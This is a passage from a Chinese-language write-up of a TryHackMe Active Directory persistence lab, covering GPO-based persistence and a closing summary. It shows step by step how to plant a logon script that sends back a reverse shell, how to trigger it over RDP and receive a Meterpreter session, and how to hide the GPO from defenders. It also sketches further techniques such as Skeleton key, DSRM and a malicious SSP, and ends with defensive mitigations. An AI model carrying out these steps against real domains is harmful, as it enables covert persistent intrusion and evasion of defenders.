<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101614593.png" alt="image-20240303101614593"></p>
<p>右键单击上述恶意策略并选择编辑：</p>
<ol>
<li>在用户配置(User Configuration)下展开<strong>Policies-&gt;Windows Settings</strong>；</li>
<li>选择<strong>Scripts (Logon/Logoff)</strong>；</li>
<li>右键单击<strong>Logon-&gt;Properties</strong>；</li>
<li>选择<strong>Scripts</strong>选项卡；</li>
<li>单击<strong>Add-&gt;Browse</strong>。</li>
</ol>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101733170.png" alt="image-20240303101733170"></p>
<p>导航到我们存储shell文件以及批处理文件的目录：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101743806.png" alt="image-20240303101743806"></p>
<p>我们选择批处理文件作为脚本，并点击“打开”和“确认”选项，然后继续点击“应用”和“确认”。这将确保每次管理员组(tier 2, 1, and 0)中的成员登录到任何计算机时，我们都会在攻击机上收到一个反向shell回调。</p>
<p>我们将通过模拟管理员用户登录来完成刚才所提及的shell回调过程，为此，我们将重置属于管理员组的某个用户的密码以便我们使用密码模拟登录，我们仍然需要使用上述的MMC控制台，但是这次我们将添加Active Directory Users and Computers管理单元。</p>
<p>选择一个管理员用户并右键单击，然后选择“重置密码…”：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101913295.png" alt="image-20240303101913295"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101921745.png" alt="image-20240303101921745"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101927186.png" alt="image-20240303101927186"></p>
<p>注意：我们需要为上述恶意GPO创建一个Logon(登录)事件，所以我们还需要确保注销我们上文中用于创建恶意GPO的RDP会话，注销过程将如下所示。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101951710.png" alt="image-20240303101951710"></p>
<p>现在，让我们使用已经修改了密码的管理员用户身份通过RDP访问thmserver1目标机器，这将触发登录事件：</p>
<pre><code class="hljs scss">xfreerdp /v:thmserver1.za.tryhackme.loc /u:<span class="hljs-string">'t1_eileen.burton'</span> /p:<span class="hljs-string">'Strong.Password123'</span> /cert:ignore +clipboard
#使用我们所设置的新密码进行登录</code></pre>
<p>然后我们将在攻击机上的端口监听器上接收到一个反向shell连接：</p>
<pre><code class="hljs scss">msf5 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; run 
<span class="hljs-selector-attr">[*]</span> Started reverse TCP handler on <span class="hljs-number">10.50</span><span class="hljs-selector-class">.84</span><span class="hljs-selector-class">.147</span>:<span class="hljs-number">4445</span> 

[*] Sending stage (<span class="hljs-number">176195</span> bytes) to <span class="hljs-number">172.31</span>.<span class="hljs-number">1.201</span>
[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.50</span>.<span class="hljs-number">84.147</span>:<span class="hljs-number">4445</span> -&gt; <span class="hljs-number">172.31</span>.<span class="hljs-number">1.201</span>:<span class="hljs-number">63695</span>) at <span class="hljs-number">202</span>x-<span class="hljs-number">05</span>-<span class="hljs-number">07</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">28</span> +<span class="hljs-number">0100</span> 

meterpreter &gt;</code></pre>
<h2 id="隐藏gpo">隐藏GPO</h2>
<p>我们不希望蓝队能够修改或删除我们所创建的恶意GPO，这会破坏我们所建立的持久性权限，因此我们可以在thmwrk1跳板主机上打开MMC控制台，并尝试隐藏我们刚才所创建的GPO。</p>
<pre><code class="hljs scss">xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'chloe.potter'</span> /p:<span class="hljs-string">'Marisa2014'</span> /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard

runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe

mmc.exe</code></pre>
<p>单击“委派”选项卡：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102110784.png" alt="image-20240303102110784"></p>
<p>在默认情况下，所有管理员都可以编辑我们上文所创建的GPO，所以让我们删除这些权限：</p>
<ol>
<li>右键单击<strong>ENTERPRISE DOMAIN CONTROLLERS</strong> (企业域控制器)，然后选择<strong>Edit settings, delete, modify security</strong>；</li>
<li>单击所有其他组(经过身份验证的用户除外)，然后单击删除。</li>
</ol>
<p>最后的委派内容将如下所示：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102201228.png" alt="image-20240303102201228"></p>
<p>单击恶意GPO的安全设置中的高级选项并从权限中删除Created Owner：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102210857.png" alt="image-20240303102210857"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102217909.png" alt="image-20240303102217909"></p>
<p>tips：在默认情况下，所有通过身份验证的用户都必须具有读取策略的权限，否则，当AD用户进行身份验证以应用用户策略时，将无法读取策略。如果我们没有部署登录脚本，我们就可以尝试删除此权限，以确保几乎没有人能够读取我们的策略。</p>
<p>接下来，我们可以将Authenticated Users替换成Domain Computers，以确保计算机可以读取和应用我们的恶意策略，但是同时我们还要阻止任何AD用户去读取恶意策略(我们需要提前测试一下反向shell回调能够正常进行，因为我们接下来的操作会使得用户无法读取PowerShell脚本)：</p>
<ol>
<li>在恶意GPO的安全设置中单击添加；</li>
<li>输入<strong>Domain Computers</strong>，然后点击<strong>Check Names</strong>并继续点击<strong>OK</strong>；</li>
<li>选择<strong>Read permissions</strong>并确认；</li>
<li>点击选中<strong>Authenticated Users</strong>并进行删除。</li>
</ol>
<p>执行上次步骤之后，我们将立即收到一个错误提示，告诉我们无法再读取策略：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102231566.png" alt="image-20240303102231566"></p>
<p>通过执行上述操作，我们可以确保蓝队无法轻易删除我们所创建的恶意GPO，除非他们选择模拟域控制器的计算机帐户。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303102628989.png" alt="image-20240303102628989"></p>
<h1 id="0x09-总结">0x09 总结</h1>
<p>我们可以通过几种不同的方式来实现域权限维持，其中的一些技术会比其他技术更加具有隐蔽性和有效性。为了确保我们所执行的权限维持设置不会被蓝队移除，我们必须创造性地思考怎么进行权限维持。</p>
<p>此外，我们不应该等到整个目标AD域都被渗透之后再考虑进行权限维持，实际上，在每一轮的横向移动和权限提升操作之后，我们就应该尝试进行域权限维持。</p>
<h2 id="其他域权限维持技术">其他域权限维持技术</h2>
<p>在本文的实验网络环境中，我们介绍了几种可用于在AD域中实现权限维持的技术；但是，我们目前所介绍的权限维持技术绝不是一个详尽的清单。下面是其他一些值得被提及的域权限维持技术：</p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/">Skeleton keys</a></strong>：使用Mimikatz，我们可以部署万能钥匙(skeleton key)，该万能钥匙可用于模拟模板AD域中的任何帐户；Mimikatz会创建一个默认密码，并将其适用于目标AD域中的任何帐户，但是原先的普通密码仍然有效，因此防御者很难知道这种攻击已经发生。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1714">Directory Service Restore Mode (DSRM)</a></strong>：每个域控制器中都有一个被称为DSRM的内部可用的管理员帐户，DSRM帐户的密码将在服务器升级为DC时设置，并且很少会发生修改，该密码能够用于在紧急情况下恢复DC；而攻击者可以使用Mimikatz来提取DSRM帐户的密码，并使用此密码获得针对目标AD环境中的域控制器(DC)的管理及访问权限。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1760">Malicious Security Support Provider (SSP)</a></strong>：利用SSP接口，我们可以将Mimikatz的mimilib添加为新的SSP，这会将目标域中的所有身份验证尝试的凭据都记录到一个日志文件中；我们可以指定用于日志记录的网络位置，这将允许mimilib把我们的凭据发送给被入侵的域内主机并进行身份验证，从而为我们提供持久化的访问权限。</li>
<li><strong><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2753">Computer Accounts</a></strong>：机器(计算机)帐户的密码通常会每30天轮换一次，但是，我们可以更改机器帐户的密码设置，让它停止自动轮换；除此之外，我们还可以授予机器帐户对于其他域内主机的管理及访问权限，这将允许我们将计算机帐户作为域内的其他AD帐户使用，我们只需要尝试让该帐户对其他主机也具有管理权限即可，而且这在AD域中通常是正常的行为，因此相关操作可能不会被蓝队认为是恶意行为。</li>
</ul>
<p>我们还应该注意到，本文的重点是AD域中的权限维持技术，而本地权限维持技术仅允许攻击者在目标主机上实现权限持久化，但是如果这些目标主机是在目标AD域内的，那么我们也可以通过本地权限维持来实现针对目标AD域的权限维持。</p>
<h2 id="缓解域权限维持威胁的措施">缓解域权限维持威胁的措施</h2>
<p>蓝队应该如何防御这些针对AD域的权限维持技术呢？在某些情况下，攻击者所执行的权限维持设置可能根深蒂固，以至于蓝队需要重新构建完整的域才能够完全清理权限维持设置；在通常情况下，蓝队可以通过以下操作来检测由攻击者所部署的权限维持设置：</p>
<ul>
<li>检测异常帐户的登录事件，当AD域的分层模型被用户凭据所破坏时，则可能是攻击者使用了域权限维持技术的结果。</li>
<li>对于上文所提到的每一种域权限维持技术，蓝队都可以编写特定的检测规则，例如蓝队可以检测机器帐户的密码更改、被允许更新的ACL、是否创建了新的GPO等。</li>
<li>用于对抗域权限维持的最佳方法是保护特权资源，尽管攻击者可以使用低特权访问权限来部署域权限维持设置，但是真正可怕的域权限维持技术只有在攻击者获得针对目标AD域的高级访问特权后才可以被使用。</li>
</ul>
<p>本文只是一个简单的技术介绍，关于AD域的安全性，我们还有很多地方需要学习。</p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/26/qian-xi-xxe-lou-dong-java/">浅析xxe漏洞-Java</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/16/thm-nmap/">THM-Nmap</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ad-%E7%BB%B4%E6%8C%81"><span class="toc-text">AD 维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E5%87%AD%E8%AF%81%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">0x02 通过凭证进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%AD%E5%96%9C%E4%BD%A0"><span class="toc-text">恭喜你</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dc-sync%E5%90%8C%E6%AD%A5"><span class="toc-text">DC Sync（同步）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B6%E9%9D%9E%E6%89%80%E6%9C%89%E5%87%AD%E8%AF%81%E9%83%BD%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84"><span class="toc-text">并非所有凭证都是一样的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dc%E5%90%8C%E6%AD%A5%E5%85%A8%E9%83%A8"><span class="toc-text">DC同步全部</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E9%80%9A%E8%BF%87%E7%A5%A8%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">0x03 通过票据持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A7%E5%85%8B%E5%8A%9B%E5%B7%A5%E5%8E%82%E9%97%A8%E7%A5%A8"><span class="toc-text">巧克力工厂门票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E9%97%A8%E7%A5%A8%E4%BB%A5%E8%8E%B7%E5%8F%96%E4%B9%90%E8%B6%A3%E5%92%8C%E5%88%A9%E6%B6%A6"><span class="toc-text">伪造门票以获取乐趣和利润</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">0x04 通过证书进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ad-cs%E5%9B%9E%E5%BD%92"><span class="toc-text">AD CS回归</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-text">提取私钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-text">生成我们自己的证书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%B8%8D%E5%86%8D%E6%98%AF%E8%93%9D%E9%98%9F%E7%9A%84%E6%9C%8B%E5%8F%8B"><span class="toc-text">我们不再是蓝队的朋友</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E9%80%9A%E8%BF%87-sid-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">0x05 通过 SID 历史记录进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%BB%E9%80%A0%E5%8E%86%E5%8F%B2"><span class="toc-text">锻造历史</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E7%9A%84%E5%B9%B2%E8%8D%89%E5%8F%89%E5%92%8C%E7%81%AB%E6%8A%8A"><span class="toc-text">蓝队的干草叉和火把</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E9%80%9A%E8%BF%87%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-text">0x06 通过组成员身份实现持久性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%9B%A2%E4%BD%93%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E5%9D%9A%E6%8C%81%E4%B8%8B%E5%8E%BB"><span class="toc-text">通过团体成员身份坚持下去</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nested-groups%E5%B5%8C%E5%A5%97%E7%BB%84"><span class="toc-text">Nested Groups(嵌套组)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B5%8C%E5%A5%97%E7%BB%84%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">基于嵌套组实现权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%A6%E4%BA%BA%E7%9A%84%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AF%E8%93%9D%E9%98%9F"><span class="toc-text">烦人的不仅仅是蓝队</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E9%80%9A%E8%BF%87acl%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">0x07 通过ACL进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ad%E7%BB%84%E6%A8%A1%E6%9D%BF"><span class="toc-text">使用AD组模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8adminsdholder%E5%AE%B9%E5%99%A8%E4%BF%AE%E6%94%B9%E5%85%B6acls%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">使用AdminSDHolder容器(修改其ACLs)实现权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%90%AF%E5%8A%A8sdprop%E8%BF%9B%E7%A8%8B"><span class="toc-text">手动启动SDProp进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E6%AD%A3%E5%9C%A8%E8%B5%B0%E4%B8%8B%E5%9D%A1%E8%B7%AF"><span class="toc-text">蓝队正在走下坡路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E9%80%9A%E8%BF%87gpo%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">0x08 通过GPO实现持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">前期准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAgpo"><span class="toc-text">创建GPO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8Fgpo"><span class="toc-text">隐藏GPO</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E6%80%BB%E7%BB%93"><span class="toc-text">0x09 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF"><span class="toc-text">其他域权限维持技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%A8%81%E8%83%81%E7%9A%84%E6%8E%AA%E6%96%BD"><span class="toc-text">缓解域权限维持威胁的措施</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 